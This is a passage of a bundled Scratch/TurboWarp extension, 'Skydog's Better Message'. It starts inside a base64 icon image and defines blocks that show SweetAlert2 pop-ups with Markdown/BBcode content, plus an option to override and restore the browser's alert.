8SWMPu0i2gqVCvIXr7eq5gL/PU29B9Xr8P+dfvt79Ou4bzAAAAAAAAXyzBOvCrswmnc0ROU3la56nnnCOlMSKnyNEtgXtOXQ3aS5V6alvGR1rfmyval6B+fh6xramuVe7pvTrrx/3ij+LkTaX55uP57nsvIXnavW73tlTN5+26dn3p+b5WqNcbGJbK9HYGetsyvrZ3b8P6TWX8/pvuv7jydAAAAAAA4FdCsA582fbZ9E7bRnxtK972cZ/roktAnpsgPC3BeBdtSJ6WtvBxv25Tbr6G7+t49kcB/IPvlN8P49t28Gk3p33f9n2zm7wP1tf9rIF3brZtP7N9vcxRv2sJH8vzTYX8Erhvj7t+3/bF/hsDAAAAAAB82QTrwG9cW6ldg/DcRskpUg3gl4ryFHVdlLbwMbeZXz8zS20l+6akvO57/5k5g8+x2Xgbh7dB/W6L1HZZbyrbm9fL/tN9EH/3fFnRtpTfrX+4/d3GAAAAAAAAv1mCdeBX4b1u66lNsj9R+px3rcrnHHyeNr7b+P0Dbzq7Hx30qNz+Z9Zp3+1ybgX/qf19sgH948M9/Ar54WXZXo704E0AAAAAAIBfJ8E68C9jW3PdNFzPj1rKP/jQ0bqffOR/lM9Mro861bcJeb37YG6eP8v5YLQ8AAAAAADAb4xgHfiXtOvYvnv9906MJdAAAAAAAAC/ZoJ14F9G2qfpAAAAAAAA8BN0/+wTAAAAAAAAAIAvmWAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAId3n60AAAnCSURBVAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAAAA4I1gEAAAAAAADggGAdAAAAAAAA+P/bs2MigGEYAGL2XfkjbLGke4ZHINEQEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAASxDgAAAAAAAABBrAMAAAAAAABAEOsAAAAAAAAAEMQ6AAAAAAAAAITnzLw7R7ADAAAAAAAAwGV3vh/+5DjRgKGYdQAAAABJRU5ErkJggg==";
    if (Scratch2.extensions.unsandboxed === false) {
      throw new Error("Sandboxed mode is not supported");
    }
    Scratch2.translate.setup({
      "zh-cn": {
        "BetterMsg.name": "\u66F4\u597D\u7684\u5F39\u7A97",
        // 注：虽然我使用的库支持HTML，但是有监管风险，故没有使用。
        "BetterMsg.help": "\u6240\u6709\u5F39\u7A97\u652F\u6301BBcode\u548CMarkdown\uFF0C\u4F18\u5148\u89E3\u6790Markdown",
        "BetterMsg.thank": "\u611F\u8C22 \u767D\u732B@CCW \u63D0\u4F9B\u7684BBcode\u89E3\u6790\u4F9D\u8D56\uFF01",
        "BetterMsg.openModal": "\u5F39\u51FA\u8986\u76D6\u5F0F\u6A21\u6001\u6846\uFF0C\u7C7B\u578B[type]\u6807\u9898[title]\u5185\u5BB9[content][anim] |\u53EF\u9009| \u5B57\u4F53\u989C\u827216\u8FDB\u5236\u4EE3\u7801[color] ",
        "BetterMsg.openModalAutoClose": "\u5F39\u51FA\u8986\u76D6\u5F0F\u6A21\u6001\u6846\uFF0C\u7C7B\u578B[type]\u6807\u9898[title]\u5185\u5BB9[content]\u5E76\u5728[time]\u79D2\u540E\u81EA\u52A8\u5173\u95ED[anim] |\u53EF\u9009| \u5B57\u4F53\u989C\u827216\u8FDB\u5236\u4EE3\u7801[color] ",
        "BetterMsg.openModalRight": "\u5F39\u51FA\u53F3\u4E0A\u89D2\u901A\u77E5\u5F39\u7A97\uFF0C\u7C7B\u578B[type]\u5185\u5BB9[content]\u5E76\u5728[time]\u79D2\u540E\u81EA\u52A8\u5173\u95ED |\u53EF\u9009| \u5B57\u4F53\u989C\u827216\u8FDB\u5236\u4EE3\u7801[color] ",
        "BetterMsg.success": "\u6210\u529F",
        "BetterMsg.warning": "\u8B66\u544A",
        "BetterMsg.error": "\u9519\u8BEF",
        "BetterMsg.info": "\u4FE1\u606F",
        "BetterMsg.question": "\u95EE\u9898",
        "BetterMsg.animOk": "\u9644\u5E26\u52A8\u753B",
        "BetterMsg.animNo": "\u4E0D\u9644\u5E26\u52A8\u753B",
        "BetterMsg.alerts": "[open]\u6D4F\u89C8\u5668\u539F\u751Falert\u5F39\u7A97",
        "BetterMsg.oalert": "\u8986\u5199",
        "BetterMsg.calert": "\u8FD8\u539F"
      },
      en: {
        "BetterMsg.name": "Skydog's Better Message",
        "BetterMsg.help": "All popups support BBcode and Markdown, prioritizing parsing of Markdown",
        "BetterMsg.thank": "Thanks to \u767D\u732B @ CCW for the BBcode parsing dependency!",
        "BetterMsg.openModal": "Open modal dialog, type [type] title [title] content [content][anim] |optional| font color hex code [color]",
        "BetterMsg.openModalAutoClose": "Open modal dialog, type [type] title [title] content [content] and close in [time] seconds[anim] |optional| font color hex code [color]",
        "BetterMsg.openModalRight": "Open notification pop-up, type [type] content [content] and close in [time] seconds |optional| font color hex code [color]",
        "BetterMsg.success": "Success",
        "BetterMsg.warning": "Warning",
        "BetterMsg.error": "Error",
        "BetterMsg.info": "Info",
        "BetterMsg.question": "Question",
        "BetterMsg.animOk": "With animation",
        "BetterMsg.animNo": "Without animation",
        "BetterMsg.alert": "[open] browser native alert dialog",
        "BetterMsg.oalert": "Override",
        "BetterMsg.calert": "Restore"
      }
    });
    function i10n(id) {
      return Scratch2.translate({ id, default: id, description: id });
    }
    class BetterMsg {
      constructor(runtime2) {
        this.runtime = runtime2;
        this.maxParsedable = 100;
      }
      getInfo() {
        return {
          id: "BetterMsg",
          name: i10n("BetterMsg.name"),
          color1: "#d9963a",
          color2: "#d9963a",
          blockIconURI: BetterMsgIconUrl,
          menuIconURI: BetterMsgIconUrl,
          blocks: [
            "---" + i10n("BetterMsg.help"),
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "openModal",
              text: i10n("BetterMsg.openModal"),
              arguments: {
                type: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "type"
                },
                title: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                content: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                anim: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "anim"
                },
                color: {
                  type: Scratch2.ArgumentType.COLOR,
                  defaultValue: "#4CAF50"
                }
              }
            },
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "openModalAutoClose",
              text: i10n("BetterMsg.openModalAutoClose"),
              arguments: {
                type: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "type"
                },
                title: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                content: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                anim: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "anim"
                },
                color: {
                  type: Scratch2.ArgumentType.COLOR,
                  defaultValue: "#4CAF50"
                },
                time: {
                  type: Scratch2.ArgumentType.NUMBER,
                  defaultValue: 3
                }
              }
            },
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "openModalRight",
              text: i10n("BetterMsg.openModalRight"),
              arguments: {
                type: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "type"
                },
                content: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                time: {
                  type: Scratch2.ArgumentType.NUMBER,
                  defaultValue: 3
                },
                color: {
                  type: Scratch2.ArgumentType.COLOR,
                  defaultValue: "#4CAF50"
                }
              }
            },
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "alerts",
              text: i10n("BetterMsg.alerts"),
              arguments: {
                open: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "open"
                }
              }
            },
            "---" + i10n("BetterMsg.thank")
          ],
          menus: {
            type: [
              {
                text: i10n("BetterMsg.success"),
                value: "success"
              },
              {
                text: i10n("BetterMsg.warning"),
                value: "warning"
              },
              {
                text: i10n("BetterMsg.error"),
                value: "error"
              },
              {
                text: i10n("BetterMsg.info"),
                value: "info"
              },
              {
                text: i10n("BetterMsg.question"),
                value: "question"
              }
            ],
            anim: [
              {
                text: i10n("BetterMsg.animOk"),
                value: "true"
              },
              {
                text: i10n("BetterMsg.animNo"),
                value: "false"
              }
            ],
            open: [
              {
                text: i10n("BetterMsg.oalert"),
                value: "open"
              },
              {
                text: i10n("BetterMsg.calert"),
                value: "close"
              }
            ]
          }
        };
      }
      // code here
      openModal(args) {
        const link = document.querySelector("#SkydogBetterMsg");
        if (!link) {
          const link2 = document.createElement("link");
          link2.id = "SkydogBetterMsg";
          link2.rel = "stylesheet";
          link2.href = "https://s4.zstatic.net/ajax/libs/animate.css/4.1.1/animate.min.css";
          document.head.appendChild(link2);
        }
        const content = "[md]" + args.content + "[/md]";
        const title = "[md]" + args.title + "[/md]";
        const type = args.type;
        const anim = args.anim;
        const color = args.color;
        if (anim === "true") {
          console.log("with animation");
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type,
            showClass: {
              popup: `
              animate__animated
              animate__fadeInUp
              animate__faster
            `
            },
            hideClass: {
              popup: `
              animate__animated
              animate__fadeOutDown
              animate__faster
            `
            }
          });
        } else {
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type
          });
        }
      }
      openModalAutoClose(args) {
        const link = document.querySelector("#SkydogBetterMsg");
        if (!link) {
          const link2 = document.createElement("link");
          link2.id = "SkydogBetterMsg";
          link2.rel = "stylesheet";
          link2.href = "https://s4.zstatic.net/ajax/libs/animate.css/4.1.1/animate.min.css";
          document.head.appendChild(link2);
        }
        const content = "[md]" + args.content + "[/md]";
        const title = "[md]" + args.title + "[/md]";
        const type = args.type;
        const anim = args.anim;
        const color = args.color;
        const time = args.time;
        if (anim === "true") {
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type,
            timer: time * 1e3,
            showClass: {
              popup: `
              animate__animated
              animate__fadeInUp
              animate__faster
            `
            },
            hideClass: {
              popup: `
              animate__animated
              animate__fadeOutDown
              animate__faster
            `
            }
          });
        } else {
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type,
            timer: time * 1e3
          });
        }
      }
      openModalRight(args) {
        const link = document.querySelector("#SkydogBetterMsg");
        if (!link) {
          const link2 = document.createElement("link");
          link2.id = "SkydogBetterMsg";
          link2.rel = "stylesheet";
          link2.href = "https://s4.zstatic.net/ajax/libs/animate.css/4.1.1/animate.min.css";
          document.head.appendChild(link2);
        }
        const color = args.color;
        const content = "[md]" + args.content + "[/md]";
        const type = args.type;
        const time = args.time * 1e3;
        import_sweetalert2.default.fire({
          toast: true,
          position: "top-end",
          showConfirmButton: false,
          timer: time,
          type,
          title: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
          color
        });
      }
      alerts(args) {
        const open = args.open;
        if (open === "open") {
          window.alert = (e) => {
            import_sweetalert2.default.fire({
              type: "info",
              titleText: e
            });
          };
        } else {
          const f = document.createElement("iframe");
          f.style.cssText = "border:0;width:0;height:0;display:none";
          document.body.appendChild(f);
          const d = f.contentWindow.document;
          d.write(
            '<script type="text/javascript">window.parent.alert = alert;<\/script>'
          );
          d.close();
        }
      }
    }
    Scratch.extensions.register(new BetterMsg());
  })(Scratch);
})();

/*! showdown v 2.1.0 - 21-04-2022 */
/*! Bundled license information:

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.11.1
  * Released under the MIT License.
  *)
*/